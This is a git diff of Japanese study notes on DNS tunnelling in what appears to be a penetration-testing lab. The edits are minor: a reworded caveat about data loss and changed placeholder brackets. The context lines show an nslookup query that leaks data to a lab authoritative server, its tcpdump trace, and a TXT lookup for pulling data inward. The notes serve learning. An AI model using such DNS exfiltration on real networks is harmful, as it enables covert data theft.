@@ -295,7 +295,7 @@ ssh <user>@240.0.0.1
 	- DNSリゾルバ（名前解決を請け負う）がローカルNWと通信可能（下図MULTISERVER03）
 	- 権威サーバー(名前解決情報を持つ)がWANにある（下図FELINEAUTHORITY）
 
-- 留意点：DNSは少量のデータしか１つのパケットでやり取りできないので、大きなデータは複数バイトに分割してやり取りしている
+- 留意点：DNSは１つのパケットで少量のデータしかやり取りできないので、大きなデータは複数バイトに分割してやり取りしており、データのドロップが発生する可能性がある
 
 ### データが外に出る仕組み
 
@@ -306,7 +306,7 @@ nslookup exfiltrated-data.feline.corp
 - ↓ローカルNWからWAN上の権威サーバーにデータが流出する
 ```zsh
 ...
-04:57:40.721682 IP [DNSリゾルバのIP].65122 > [権威サーバのIP].domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)
+04:57:40.721682 IP <DNSリゾルバのIP>.65122 > <権威サーバのIP>.domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)
 ```
 
 ### データが内に入る仕組み
@@ -319,7 +319,7 @@ nslookup -type=txt <domain>
 ```zsh
 ...
 Non-authoritative answer:
-<domain>      text = "[string]"
+<domain>      text = "<string>"
 ```
 
 ![](../../../画像ファイル/Pasted%20image%2020250927150533.png)
